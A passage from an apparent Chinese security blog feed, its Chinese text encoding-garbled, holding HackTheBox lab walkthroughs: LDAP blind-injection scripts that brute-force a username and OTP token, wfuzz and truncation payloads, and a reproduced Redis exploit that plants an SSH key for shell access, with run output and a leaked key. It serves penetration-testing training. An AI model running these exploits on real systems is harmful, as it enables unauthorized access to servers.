<p>å½“å°è¯•åˆ°ä¸‰ä¸ªæ‹¬å·ç”¨äºé—­åˆæ—¶ï¼ŒæˆåŠŸè¿”å›äº†<code>User ca01h%29%29%29%00 not found</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªç™»å½•æ¡†çš„LDAPæŸ¥è¯¢çš„åŸºæœ¬å½¢å¼å°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(password&#x3D;1234)</span><br><span class="line">		(uid&#x3D;ca01h)))%00</span><br><span class="line">	)</span><br><span class="line">	(&amp;|</span><br><span class="line">		(other comparing)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>æ¥ç€ï¼Œæˆ‘ä»¬å†å›å¤´å»çœ‹ä¸€ä¸‹Fuzzå‡ºæ¥çš„è¢«è¿‡æ»¤çš„å­—ç¬¦ï¼Œå…¶ä¸­<code>%25%2a</code>è¿”å›çš„æ¶ˆæ¯é•¿åº¦ä¸º231 Words</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710203938.png" alt=""></p>
<p>å‘ç°å›æ˜¾çš„æ¶ˆæ¯æ˜¯<code>Cannot login</code>ï¼Œè¯´æ˜å¯ä»¥ç”¨<code>*</code>é€šé…ç¬¦æ¥ç›²æ³¨ç”¨æˆ·åï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">### username_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://10.10.10.122/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">username, done = <span class="string">&#x27;&#x27;</span>, <span class="literal">False</span></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> ascii_lowercase:</span><br><span class="line">		payload = username + c + quote_plus(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">&#x27;inputUsername&#x27;</span>: payload,</span><br><span class="line">			<span class="string">&#x27;inputOTP&#x27;</span>: <span class="string">&#x27;1234&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		resp = requests.post(URL, data=data)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;Cannot login&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">			username += c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        sys.stdout.write(<span class="string">f&#x27;\r<span class="subst">&#123;username&#125;</span><span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">		time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[+] Username: <span class="subst">&#123;username&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710210916.png" alt=""></p>
<p>ç”¨æˆ·åä¸º<code>ldapuser</code></p>
<p>çŸ¥é“äº†ç”¨æˆ·åä¹‹åï¼Œæˆ‘ä»¬å°±è¦å»è·å–ç”ŸæˆOTPçš„81ä½tokenï¼Œé€šè¿‡é¡µé¢æºä»£ç çš„æç¤ºï¼Œè¿™ä¸ªtokenå­˜å‚¨åœ¨æŸä¸€ä¸ªLDAPé»˜è®¤å·²ç»å­˜åœ¨çš„å±æ€§å½“ä¸­ã€‚è€Œé»˜è®¤çš„å±æ€§å¯ä»¥åœ¨<a href="https://www.youtube.com/watch?v=51JQg202csw">PayloadsAllTheThings</a>ä¸­æ‰¾åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">cn</span><br><span class="line">co</span><br><span class="line">commonName</span><br><span class="line">dc</span><br><span class="line">facsimileTelephoneNumber</span><br><span class="line">givenName</span><br><span class="line">gn</span><br><span class="line">homePhone</span><br><span class="line">id</span><br><span class="line">jpegPhoto</span><br><span class="line">l</span><br><span class="line">mail</span><br><span class="line">mobile</span><br><span class="line">name</span><br><span class="line">o</span><br><span class="line">objectClass</span><br><span class="line">ou</span><br><span class="line">owner</span><br><span class="line">pager</span><br><span class="line">password</span><br><span class="line">sn</span><br><span class="line">st</span><br><span class="line">surname</span><br><span class="line">uid</span><br><span class="line">username</span><br><span class="line">userPassword</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä¸æƒ³å†™è„šæœ¬çš„è¯ç”¨wfuzzæ¥Fuzzé¶æœºçš„LDAPä¸­å­˜åœ¨çš„å±æ€§å¯èƒ½ä¼šæ›´å¿«ä¸€äº›ï¼Œä½†è¿˜æ˜¯è¦å…ˆæ‰¾åˆ°æ³¨å…¥çš„å½¢å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(password&#x3D;1234)</span><br><span class="line">		(uid&#x3D;ldapuser)</span><br><span class="line">		(FUZZ&#x3D;*)</span><br><span class="line">	)</span><br><span class="line">	(&amp;|</span><br><span class="line">		(other comparing)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>æ­¤å¤–è¿˜è¦æŠŠæ³¨å…¥çš„å­—ç¬¦<code>ldapuser)(FUZZ=*</code>è¿›è¡ŒäºŒæ¬¡URLç¼–ç ï¼Œç¼–ç ä¹‹åçš„ç»“æœ<code>ldapuser%2529%2528FUZZ%253d%252a</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;ldapuser%2529%2528FUZZ%253d%252a&amp;inputOTP&#x3D;1234&#39; -w LDAP_attributes.txt http:&#x2F;&#x2F;10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710213532.png" alt=""></p>
<p>æˆ‘ä»¬Fuzzå‡ºæ¥äº†è¿™ä¹ˆäº›å±æ€§æ˜¯å­˜åœ¨äºé¶æœºçš„LDAPæœåŠ¡ä¸­çš„ï¼Œç°åœ¨çš„å·¥ä½œå°±æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„å±æ€§æ¥çŒœè§£ï¼Œå±äºä¸€äº›é‡å¤æ€§çš„å·¥ä½œï¼Œå°±ä¸åœ¨è¿™é‡Œè¿‡å¤šèµ˜è¿°äº†ï¼Œæœ€åå¯ä»¥æ‰¾åˆ°tokenæ˜¯å­˜å‚¨äºpagerå±æ€§ä¸­ã€‚æ¥ç€å†™è„šæœ¬burp81ä½token</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># pager_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://10.10.10.122/login.php&quot;</span></span><br><span class="line">attribute = <span class="string">&quot;pager&quot;</span></span><br><span class="line">loop = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> loop &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> digits:</span><br><span class="line">        token = token</span><br><span class="line">        <span class="comment"># ldapuser)(pager=&lt;token&gt;)*</span></span><br><span class="line">        payload = <span class="string">f&quot;ldapuser%29%28<span class="subst">&#123;attribute&#125;</span>%3d<span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>%2a&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;inputUsername&quot;</span>: payload, <span class="string">&quot;inputOTP&quot;</span>: <span class="string">&quot;1234&quot;</span>&#125;</span><br><span class="line">        r = requests.post(URL, data=data)</span><br><span class="line">        sys.stdout.write(<span class="string">f&quot;\rToken: <span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>&quot;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Cannot login&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            token += digit</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> digit == <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            loop = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710220938.png" alt=""></p>
<p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯éœ€è¦åˆ æ‰æœ€åçš„ä¸€ä¸ª9ï¼Œæ‰€ä»¥æœ€åçš„tokenå°±æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">285449490011357156531651545652335570713167411445727140604172141456711102716717000</span><br></pre></td></tr></table></figure>
<p>æ¥ç€ç”¨stokenå·¥å…·å¯¼å…¥token</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710221459.png" alt=""></p>
<p>ç”ŸæˆOTP</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230111.png" alt=""></p>
<p>æˆåŠŸç™»å½•åï¼Œè·³è½¬åˆ°<code>page.php</code>é¡µé¢ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230246.png" alt=""></p>
<p>ä½†æ˜¯æç¤ºæˆ‘ä»¬<code>ldapuser</code>æƒé™ä¸å¤Ÿä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œæœ‰ä¸¤ç§åŠæ³•ï¼š</p>
<ul>
<li>
<p>å¯¹<code>group</code>å±æ€§è¿›è¡Œæ³¨å…¥ï¼Œå³æŠŠåé¢groupå±æ€§çš„filteræˆªæ–­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(pager&#x3D;&lt;token&gt;)</span><br><span class="line">		(uid&#x3D;ldapuser)))%00</span><br><span class="line">	)</span><br><span class="line">	(|</span><br><span class="line">		(group&#x3D;root)</span><br><span class="line">		(group&#x3D;adm)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>ä½¿ç”¨<code>*</code>é€šé…ç¬¦ä½œä¸ºç”¨æˆ·åç™»å½•</p>
</li>
</ul>
<p>è¿™é‡Œæ¼”ç¤ºä¸€ä¸‹ç¬¬ä¸€ç§æ–¹æ¡ˆï¼Œpayloadç›´æ¥æ”¾åˆ°burpä¸­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapuser%2529%2529%2529%2500</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233124.png" alt=""></p>
<p>å†å»æ‰§è¡Œlså‘½ä»¤</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233303.png" alt=""></p>
<p>è¯»å–page.phpæ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234438.png" alt=""></p>
<p>SSHç™»å½•ï¼š<code>fdapuser:e398e27d5c4ad45086fe431120932a01</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234624.png" alt=""></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Postman Walkthrough</title>
    <url>/Target_drone/HackTheBox/2.HTB-Postman-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Postman-Walkthrough">HTB::Postman Walkthrough</h1>
<h2 id="0x01-é¶æœºä»‹ç»">0x01 é¶æœºä»‹ç»</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200210183311.png" alt=""></p>
<h2 id="0x02-ä½¿ç”¨å·¥å…·å’ŒçŸ¥è¯†ç‚¹">0x02 ä½¿ç”¨å·¥å…·å’ŒçŸ¥è¯†ç‚¹</h2>
<ul>
<li>nmap</li>
<li>redis server</li>
<li><a href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a></li>
<li><a href="http://ssh2john.py">ssh2john.py</a></li>
<li>John</li>
<li><a href="https://github.com/diego-treitos/linux-smart-enumeration#linux-smart-enumeration">lse.sh</a></li>
<li>webmin_packageup_rce</li>
</ul>
<h2 id="0x03-æ¸—é€è¿‡ç¨‹">0x03 æ¸—é€è¿‡ç¨‹</h2>
<p>æ‰«æç›®æ ‡ä¸»æœºæ‰€æœ‰ç«¯å£ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nmap -A -Pn -T4 -p- 10.10.10.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-09 23:18 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> postman.htb (10.10.10.160)</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 65531 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)</span><br><span class="line">|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)</span><br><span class="line">|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">&#x27;s Personal Website</span></span><br><span class="line"><span class="string">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="string">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_http-server-header: MiniServ/1.910</span></span><br><span class="line"><span class="string">|_http-trane-info: Problem with XML parsing of /evox/about</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
<p>ä¸»è¦æ¥çœ‹ä¸€ä¸‹80ã€6379å’Œ10000ç«¯å£ã€‚</p>
<p>80ç«¯å£ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200210140034.png" alt=""></p>
<p>6379ç«¯å£ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200210140240.png" alt=""></p>
<p>10000ç«¯å£ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200210140417.png" alt=""></p>
<p>é€šå¸¸80ç«¯å£æ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨çš„ä¸œè¥¿ï¼Œ10000ç«¯å£ä¸Šè¿è¡ŒWebminæœåŠ¡å°è¯•å¼±å£ä»¤æ²¡æœ‰æ•ˆæœï¼Œè€ŒredisæœåŠ¡æš´éœ²åœ¨6379ç«¯å£ï¼Œå¯ä»¥ä»è¿™é‡Œä¸‹æ‰‹ï¼ŒGoogle<code>redis key store 4.0.9 expolit</code>ï¼Œæ‰¾åˆ°ä¸‹é¢åˆ©ç”¨æ–¹å¼</p>
<p><a href="https://github.com/Avinash-acid/Redis-Server-Exploit">https://github.com/Avinash-acid/Redis-Server-Exploit</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#Author : Avinash Kumar Thapa aka -Acid</span></span><br><span class="line"><span class="comment">#Twitter : https://twitter.com/m_avinash143</span></span><br><span class="line"><span class="comment">#####################################################################################################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">script, ip_address, username = argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PATH=<span class="string">&#x27;/usr/bin/redis-cli&#x27;</span></span><br><span class="line">PATH1=<span class="string">&#x27;/usr/local/bin/redis-cli&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_connection</span>():</span></span><br><span class="line">	shell = <span class="string">&quot;ssh -i &quot;</span> + <span class="string">&#x27;$HOME/.ssh/id_rsa &#x27;</span> + username+<span class="string">&quot;@&quot;</span>+ip_address</span><br><span class="line">	os.system(shell)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(PATH) <span class="keyword">or</span> os.path.isfile(PATH1):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    		<span class="keyword">print</span> colored(<span class="string">&#x27;\t*******************************************************************&#x27;</span>, <span class="string">&quot;green&quot;</span>)</span><br><span class="line">    		<span class="keyword">print</span> colored(<span class="string">&#x27;\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*&#x27;</span> ,<span class="string">&quot;green&quot;</span>)</span><br><span class="line">    		<span class="keyword">print</span> colored(<span class="string">&#x27;\t* [+] AVINASH KUMAR THAPA aka &quot;-Acid&quot;                                &#x27;</span>, <span class="string">&quot;green&quot;</span>)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">&#x27;\t*******************************************************************&#x27;</span>, <span class="string">&quot;green&quot;</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">&quot;\t SSH Keys Need to be Generated&quot;</span>, <span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">		os.system(<span class="string">&#x27;ssh-keygen -t rsa -C \&quot;acid_creative\&quot;&#x27;</span>)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">&quot;\t Keys Generated Successfully&quot;</span>, <span class="string">&quot;blue&quot;</span>)</span><br><span class="line">		os.system(<span class="string">&quot;(echo &#x27;\r\n\&#x27;; cat $HOME/.ssh/id_rsa.pub; echo  \&#x27;\r\n\&#x27;) &gt; $HOME/.ssh/public_key.txt&quot;</span>)</span><br><span class="line">		cmd = <span class="string">&quot;redis-cli -h &quot;</span> + ip_address + <span class="string">&#x27; flushall&#x27;</span></span><br><span class="line">		cmd1 = <span class="string">&quot;redis-cli -h &quot;</span> + ip_address</span><br><span class="line">		os.system(cmd)</span><br><span class="line">		cmd2 = <span class="string">&quot;cat $HOME/.ssh/public_key.txt | redis-cli -h &quot;</span> +  ip_address + <span class="string">&#x27; -x set cracklist&#x27;</span></span><br><span class="line">		os.system(cmd2)</span><br><span class="line">		cmd3 = cmd1 + <span class="string">&#x27; config set dbfilename &quot;backup.db&quot; &#x27;</span></span><br><span class="line">		cmd4 = cmd1 + <span class="string">&#x27; config set  dir&#x27;</span> + <span class="string">&quot; /usr/lib/&quot;</span>+username+<span class="string">&quot;/.ssh/&quot;</span></span><br><span class="line">		cmd5 = cmd1 + <span class="string">&#x27; config set dbfilename &quot;authorized_keys&quot; &#x27;</span></span><br><span class="line">		cmd6 = cmd1 + <span class="string">&#x27; save&#x27;</span></span><br><span class="line">		os.system(cmd3)</span><br><span class="line">		os.system(cmd4)</span><br><span class="line">		os.system(cmd5)</span><br><span class="line">		os.system(cmd6)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">&quot;\tYou&#x27;ll get shell in sometime..Thanks for your patience&quot;</span>, <span class="string">&quot;green&quot;</span>)</span><br><span class="line">		ssh_connection()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">&quot;Something went wrong&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">print</span> colored(<span class="string">&quot;\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further.&quot;</span>, <span class="string">&quot;red&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œ<code>python2 exp.py 10.10.10.160 redis</code>ï¼ŒSSHç™»å½•é¶æœºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~/Desktop/HTB Scripts/Redis$ python2 exp.py 10.10.10.160 redis</span><br><span class="line">        *******************************************************************</span><br><span class="line">        * [+] [Exploit] Exploiting misconfigured REDIS SERVER*</span><br><span class="line">        * [+] AVINASH KUMAR THAPA aka <span class="string">&quot;-Acid&quot;</span>                                </span><br><span class="line">        *******************************************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         SSH Keys Need to be Generated</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/kali/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/kali/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/kali/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:wMzHMZr3ew4dVP3cXrwsWg7JF7ay4peQHLplhK7BDww acid_creative</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 3072]----+</span></span><br><span class="line"><span class="string">|        o     .. |</span></span><br><span class="line"><span class="string">|     + + o   .  .|</span></span><br><span class="line"><span class="string">|      B =   .  oo|</span></span><br><span class="line"><span class="string">|   E   = + . o  *|</span></span><br><span class="line"><span class="string">|    + . S = + +.o|</span></span><br><span class="line"><span class="string">|     = o * B * o.|</span></span><br><span class="line"><span class="string">|      = + + % .  |</span></span><br><span class="line"><span class="string">|     . o . O .   |</span></span><br><span class="line"><span class="string">|        ..o .    |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">         Keys Generated Successfully</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">(error) ERR Changing directory: No such file or directory</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">        You&#x27;</span>ll get shell <span class="keyword">in</span> sometime..Thanks <span class="keyword">for</span> your patience</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Mon Feb 10 08:46:56 2020 from 10.10.15.125</span><br><span class="line">redis@Postman:~$ <span class="built_in">pwd</span></span><br><span class="line">/var/lib/redis</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æŸ¥çœ‹<code>/etc/passwd</code>å’Œ<code>/home</code>ç›®å½•ï¼Œå‘ç°æœ‰ä¸€ä¸ªMattç”¨æˆ·ï¼Œè€Œä¸”user.txtæƒé™ä¹Ÿå±äºMattã€‚è®¾æ³•æå‡æƒé™ï¼Œ<code>/opt</code>ç›®å½•ä¸‹æœ‰ä¸€ä¸ª<code>id_rsa.bak</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<blockquote>
<p>è¿˜å¯ä»¥ç”¨LinEnum.shæ¥æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200211201004.png" alt=""></p>
</blockquote>
